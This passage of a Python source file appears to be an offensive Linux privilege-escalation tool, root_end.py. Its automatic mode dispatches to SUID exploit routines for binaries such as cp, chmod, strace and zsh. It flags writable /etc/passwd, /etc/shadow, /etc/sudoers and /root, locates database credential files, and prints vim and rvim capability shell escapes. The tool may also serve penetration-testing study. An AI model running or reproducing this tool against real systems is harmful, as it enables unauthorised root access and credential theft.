                        start_stop_daemon_priv_esc()
                    elif name == "stdbuf":
                        #call function named stdbuf_priv_esc
                        stdbuf_priv_esc()
                    elif name == "strace":
                        #call function named strace_priv_esc
                        strace_priv_esc()
                    elif name == "taskset":
                        #call function named taskset_priv_esc
                        taskset_priv_esc()
                    elif name == "time":
                        #call function named time_priv_esc
                        time_priv_esc()
                    elif name == "timeout":
                        #call function timeout_priv_esc
                        timeout_priv_esc()
                    elif name == "unshare":
                        #call function named unshare_priv_esc
                        unshare_priv_esc()
                    elif name == "xargs":
                        #call function named xargs_priv_esc
                        xargs_priv_esc()
                    elif name == "zsh":
                        #call function named zsh_priv_esc
                        zsh_priv_esc()
                if name in suid_mody:
                    #call function named config_msg
                    config_msg()
                    if name == "cp":
                        #set new flag value
                        flag1 = "true"
                        #call function named cp_priv_esc
                        cp_priv_esc()
                    elif name == "mv":
                        #set new flag value
                        flag1 = "true"
                        #call function named mv_priv_esc
                        mv_priv_esc()
                elif name in suid_mody2:
                    if name == "chmod":
                        #set new flag value
                        flag2 = "true"
                        #call function named chmod_priv_esc
                        chmod_priv_esc()
                    elif name== "chown":
                        #set new flag value
                        flag2 = "true"
                        #call function named chown_priv_esc
                        chown_priv_esc()
            elif flag3 == "manual":
                if name in suid_manual3:
                    #call function named important_msg0
                    important_msg0()
                    print(suid_manual3[name] + '\n')
                elif name in suid_mody:
                    if name == "cp":
                        #call function named cp_priv_esc2
                        cp_priv_esc2()
                    elif name == "mv":
                        #call function named mv_priv_esc2
                        mv_priv_esc2()
                elif name in suid_mody2:
                    if name == "chown":
                        #call function named chown_priv_esc2
                        chown_priv_esc2()
                    elif name == "chmod":
                        #call function named chmod_priv_esc2
                        chmod_priv_esc2()

    #return flags values
    return flag1, flag2


#banner_msg function
def banner_msg(filename):
    print("=================================================")
    print("[!] Found weak permissions of {} file...".format(filename))
    print("=================================================\n")


#banner_msg2 function
def banner_msg2(filename):
    print("===========================================================")
    print("[!] Found ownership misconfiguration of {} file...".format(filename))
    print("===========================================================\n")


#banner_msg3 function
def banner_msg3(filename):
    print("===========================================================")
    print("[!] Found group misconfiguration of {} file...".format(filename))
    print("===========================================================\n")


#banner_msg4 function
def banner_msg4(filename):
    print("============================")
    print("[!] Access in " + filename)
    print("============================\n")


#banner_msg5 function
def banner_msg5(filename):
    print("==================")
    print("[!] Found file:")
    print("==================\n")
    print(filename + "\n")


#controller function
def controller(flag):
    #print(flag)

    if flag != "manual":
        #call function config_msg
        config_msg()

        #call function named cp_priv_esc
        cp_priv_esc()


#controller2 function
def controller2(flag, filename):
    if flag == "manual":
        #call function named banner_msg4
        banner_msg4(filename)
    else:
        #call function named chmod_priv_esc
        chmod_priv_esc()


#checker_general function
def checker_general(filename, me):
    #print(filename)
    #print(me)

    #find status of file
    status = stat(filename)
    #print(status)

    #find owner and group of the file
    uid = status.st_uid
    gid = status.st_gid
    #print(uid)
    #print(gid)

    ownername = pwd.getpwuid(uid)[0]
    groupname = grp.getgrgid(gid)[0]
    #print(ownername)
    #print(groupname)

    #convert status to octal and keep last past three digits
    octa_status = oct(status.st_mode)[-3:] 
    octa_status2 = oct(status.st_mode)[-2:]
    octa_status3 = oct(status.st_mode)[-1:]
    #print(octa_status)
    #print(octa_status2)

    return ownername, groupname, octa_status, octa_status2, octa_status3
    

#passwd_check function
def passwd_check(user_var, flag):
    #set filename
    filename = '/etc/passwd'
    #print(user_var)
    #print(flag)

    #call function named checker_general
    result = checker_general(filename, user_var)
    #print(result[3])

    if result[2] != '644':
        if  result[4] != '0' and result[4] != '1' and result[4] != '4' and result[4] != '5':  
            #call function named banner_msg
            banner_msg(filename)

            #call function named controller
            controller(flag)


#ownership_passwd_check function
def ownership_passwd_check(user_var, flag):
    #set filename
    filename = '/etc/passwd'
    #print(user_var)
    #print(flag)

    #call function named checker_general
    result = checker_general(filename, user_var)
    #print(result[3])
    #exit()

    if result[0] == user_var:
        if result[2] >= '600':
            #call function named banner_msg2
            banner_msg2(filename)

            #call function named controller
            controller(flag)

        elif result[2] >= '200' and result[2]  < '400': 
            #call function named banner_msg2
            banner_msg2(filename)

            #call function named controller
            controller(flag)
                
    elif result[1] == user_var:
        if result[3] >= '60':
            #call function named banner_msg3
            banner_msg3(filename)
            
            #call function named controller
            controller(flag)
        
        elif result[3] >= '20' and result[3] < '40':
            #call function named banner_msg3
            banner_msg3(filename)
            
            #call function named controller
            controller(flag)


#shadow_check function
def shadow_check(user_var, flag):
    #set filename
    filename = '/etc/shadow'

    #call function named checker_general
    result = checker_general(filename, user_var)
    #print(result[3])

    if result[2] != '640':
        if result[4] >= '4':
            #call function named banner_msg
            banner_msg(filename)

            #call function named banner_msg4
            banner_msg4(filename)


#ownership_shadow_check function
def ownership_shadow_check(user_var, flag):
    #set filename
    filename = '/etc/shadow'

    #call function named checker_general
    result = checker_general(filename, user_var)

    if result[0] == user_var:
        if result[2] >= '400':
            #call function named banner_msg2
            banner_msg2(filename)

            #call function named banner_msg4
            banner_msg4(filename)
    elif result[1] == user_var:
        if result[2] >= '400':
            #call function named banner_msg3
            banner_msg3(filename)

            #call function named banner_msg4
            banner_msg4(filename)


#root_dir_check function
def root_dir_check(user_var, flag):
    #set filename
    filename = '/root'
    #print(flag)

    #call function named checker_general
    result = checker_general(filename, user_var)
    #print(result[0])

    if result[2] != '700':
         if result[4] == "5" or result[4] == "7":
             #call function named banner_msg
             banner_msg(filename)

             #call function named banner_msg4
             banner_msg4(filename)


#ownership_root_dir_check function
def ownership_root_dir_check(user_var, flag): 
    #set filename
    filename = '/root'
    #print(flag)

    #call function named checker_general
    result = checker_general(filename, user_var)
    #print(result[0])
    
    if result[0] == user_var:
        if (result[2] >= '500' and result[2] < '600') or result[2] >= '700':
            #call function named banner_msg2
            banner_msg2(filename)
            
            #call function named controller2
            controller2(flag, filename)

    elif result[1] == user_var:
        if (result[3] >= '50' and result[3] < '60') or result[3] >= '70':
            #call function named banner_msg3
            banner_msg3(filename)
            
            #call function named controller2
            controller2(flag, filename)


#sudoers_checK function
def sudoers_check(user_var):
    #set filename
    filename = '/etc/sudoers'

    #call function named checker_general
    result = checker_general(filename, user_var)
    #print(result[0])

    if result[2] != '440':
        if result[4] != '0' and result[4] != '1':
            #call function named banner_msg
            banner_msg(filename)

            #call function named banner_msg4
            banner_msg4(filename)


#ownership_sudoers_check function
def ownership_sudoers_check(user_var):
    #set filename
    filename = '/etc/sudoers'

    #call function named checker_general
    result = checker_general(filename, user_var)
    #print(result[0])

    if result[0] == user_var:
        if result[2] >= '400':
            #call function named banner_msg2
            banner_msg2(filename)

            #call function named banner_msg4
            banner_msg4(filename)
        elif result[2] >= '200' and result[2] < '400':
            #call function named banner_msg2
            banner_msg2(filename)

            #call function named banner_msg4
            banner_msg4(filename)
    elif result[1] == user_var:
        if result[3] >= '40':
            #call function named banner_msg3
            banner_msg3(filename)
            
            #call function named banner_msg4
            banner_msg4(filename)
        elif result[3] >= '20' and result[3] < '40':
            #call function named banner_msg3
            banner_msg3(filename)
            
            #call function named banner_msg4
            banner_msg4(filename)


#apache_check2 function
def apache_check2(filename, user_var):
    #print(filename)
    #print(user_var)
 
    #call function named checker_general
    result = checker_general(filename, user_var)
    #print(result[0])

    if result[2] != '644':
        if result[4] != '0' and result[4] != '1' and result[4] != '4' and result[4] != '5':
            #call function named banner_msg
            banner_msg(filename)
        
            #call function named banner_msg4
            banner_msg4(filename)


#owner_apache_check function
def owner_apache_check(filename, user_var):
    #print(filename)
    #print(user_var)

    #call function named checker_general
    result = checker_general(filename, user_var)
    #print(result[0])

    if result[0] == user_var:
        if result[2] >= '600':
            #call function named banner_msg2
            banner_msg2(filename)

            #call function named banner_msg4
            banner_msg4(filename)

        elif result[2] >= '200' and result[2] < '400':
            #call function named banner_msg2
            banner_msg2(filename)

            #call function named banner_msg4
            banner_msg4(filename)
    elif result[1] == user_var:
        if result[3] >= '60':
            #call function named banner_msg3
            banner_msg3(filename)

            #call function named banner_msg4
            banner_msg4(filename)
        elif result[3] >= '20' and result[3] < '40':
            #call function named banner_msg3
            banner_msg3(filename)

            #call function named banner_msg4
            banner_msg4(filename)


#apache_check function
def apache_check(user_var):
    start = "/etc/"

    for dirpath, dirnames, filenames in walk(start):
        for filename in filenames:
            if filename == "apache2.conf" or filename == "httpd.conf": #Ubuntu/Debian or #Redhat
                filename = path.join(dirpath, filename)
                #print(filename)
                #print(dirpath)
                #call function named apache_check2
                apache_check2(filename, user_var)

                #call function named owner_apache_check
                owner_apache_check(filename, user_var)

            #elif filename == "httpd.conf": #Redhat
            #    filename = path.join(dirpath, filename)
                #print(filename)
                #print(dirpath)
            #    apache_check2(filename, user_var)

                #call function named owner_apache_check
            #    owner_apache_check(filename, user_var)
                

#db_files_check function
def db_files_check():
    #set list of start directories
    start = [ "/var", "/usr", "/home" ] #supports Ubuntu/Debian/Red Hat/BSD

    for i in start:
        for dirpath, dirnames, filenames in walk(i):
            for filename in filenames:
                if filename in php_files:
                    #print(filename)
                    filename = path.join(dirpath, filename)
                    #call function named banner_msg5
                    banner_msg5(filename)


#redis_check2 function
def redis_check2(filename, me):
    #print(filename)
    #print(me)

    #call function named checker_general
    result = checker_general(filename, me)
    #print(result[0])

    if result[2] != '640':
        if result[4] >= '2':
            #call function named banner_msg
            banner_msg(filename)
    

#owner_redis_check function
def owner_redis_check(filename, me):
    #print(filename)
    #print(me)

    #call function named checker_general
    result = checker_general(filename, me)
    #print(result[0])
    
    if result[0] == me:
        if result[2] >= '400':
            #call function named banner_msg2
            banner_msg2(filename)
        elif result[2] >= '200' and result[2] < '400':
            #call function named banner_msg2
            banner_msg2(filename)
    elif result[1] == me:
        if result[3] >= '40':
            #call function named banner_msg3
            banner_msg3(filename)
        elif result[3] >= '20' and result[3] < '40':
            #call function named banner_msg3
            banner_msg3(filename)


#redis_check function
def redis_check(user_var):
    #print(user_var)
    start = "/etc/"

    for dirpath, dirnames, filenames in walk(start):
        for filename in filenames:
            if filename in redis_files:
                filename = path.join(dirpath, filename)
                #print(filename)
                #print(dirpath)
                #call function named redis_check2
                redis_check2(filename, user_var)

                #call function named owner_redis_check
                owner_redis_check(filename, user_var)


#job_finish function
def job_finish():
    #print("\n")
    print("==========================")
    print("[!] Scanning finished...")
    print("==========================\n")
    exit()


#rvim_capa function
def rvim_capa():
    command = '''
-> rvim -c ':lua os.execute("reset; exec sh")'
    '''
    print(command)


#vim_capa function
def vim_capa():
    command = '''
-> vim -c ':lua os.execute("reset; exec sh")'
    '''
    print(command)


#capa_check function
def capa_check():
    command = '''
getcap -r / 2>/dev/null
    '''
    result = popen(command).read().strip().split("\n")

    for i in result:
        name = i.split("/")[::-1][0]
        #print(name)
        name2 = name.split("=")[::1][0]
        #print(name2)
        name3 = name2.split(" ")[::1][0]
        #print(name3)
        if name3 not in capa_default:
            print("===============================================")
            print("[!] Found interesting capability: " + name3)
            print("===============================================\n")
            print("================================")
            print("Details of " + name3 + ":")
            print("================================\n")
            print(i + "\n")
            if name3 in capa_exec:
                #call function named important_msg5
                important_msg5()
                print(capa_exec[name3] + "\n")
            elif name3 == "rvim":
                #call function named improtant_msg6
                important_msg7()
                #call function named rvim_capa
                rvim_capa()
            elif name3 == "vim":
                #call function named important_msg7
                important_msg7()
                #call function named vim_capa
                vim_capa()


#main function
def main(flag1, flag2):
    #print ascii art
    print(message)

    #sets args menu
    parser = argparse.ArgumentParser(formatter_class=argparse.RawDescriptionHelpFormatter, epilog=textwrap.dedent('''\
            usage examples:
              ./root_end.py -a
              ./root_end.py -m
              ./root_end.py -v

              *Use only one argument!'''))

    #parser.add_argument("-o", "--output", metavar='filename', dest='output', help="save output")
    parser.add_argument("-v", "--version", action='store_true', dest='version', help="show version and exit")
    parser.add_argument("-a", "--auto", action='store_true', dest='auto', help="automated privilege escalation process.")
    parser.add_argument("-m", "--manual", action='store_true', dest='manual', help="system enumeration.")
    args = parser.parse_args()
    
    if len(argv) == 1 or len(argv) > 2:
        parser.print_help()
        exit()
    elif len(argv) == 2:
        if args.version:
            print("[+] Current Version: " + __version__)
            exit()
        elif args.auto:
            #call function begin_pros
            user_var = begin_pros()
            #print(user_var)
            
            #set flag3
            flag3 = "auto"

            #call function named suid_exp and save return value to flag variable
            flag = suid_exp(flag1,flag2,flag3)   

            if flag[0] != "true":
                #call function named passwd_check
                passwd_check(user_var, flag3)

                #call function ownership_passwd_check
                ownership_passwd_check(user_var, flag3)
            
            #call function named shadow_check
            shadow_check(user_var, flag3)

            #call function named ownership_shadow_check
            ownership_shadow_check(user_var, flag3)

            if flag[1] != "true":
                #call fuction named root_dir_check
                root_dir_check(user_var, flag3)

                #call function named ownership_root_dir_check
                ownership_root_dir_check(user_var, flag3)

            #call function named sudoers_check
            sudoers_check(user_var)
            
            #call function named ownership_sudoers_check
            ownership_sudoers_check(user_var)

            #call function named apache_check
            apache_check(user_var)

            #call function named redis_check
            redis_check(user_var)

            #call function named db_files_check
            db_files_check()

            #call function capa_check
            capa_check()

            #call function named job_finish
            job_finish()

        elif args.manual:
            #call function begin_pros
            user_var = begin_pros()

            #set flag3
            flag3 = "manual"

            #call function named suid_exp and save return value to flag variable
            flag = suid_exp(flag1,flag2,flag3)   

            #call function named passwd_check
            passwd_check(user_var, flag3)

            #call function ownership_passwd_check
            ownership_passwd_check(user_var, flag3)

            #call function named shadow_check
            shadow_check(user_var, flag3)
            
            #call function named ownership_shadow_check
            ownership_shadow_check(user_var, flag3)

            #call fuction named root_dir_check
            root_dir_check(user_var, flag3)

            #call function named ownership_root_dir_check
            ownership_root_dir_check(user_var, flag3)

            #call function named sudoers_check
            sudoers_check(user_var)

            #call function named ownership_sudoers_check
            ownership_sudoers_check(user_var)

            #call function named apache_check
            apache_check(user_var)

            #call function named redis_check
            redis_check(user_var)
            
            #call function named db_files_check
            db_files_check()
            
            #call function capa_check
            capa_check()

            #call function named job_finish
            job_finish()


if __name__ == "__main__":
    #set flags
    flag1 = "false"
    flag2 = "false"

    #call function named main
    main(flag1,flag2)
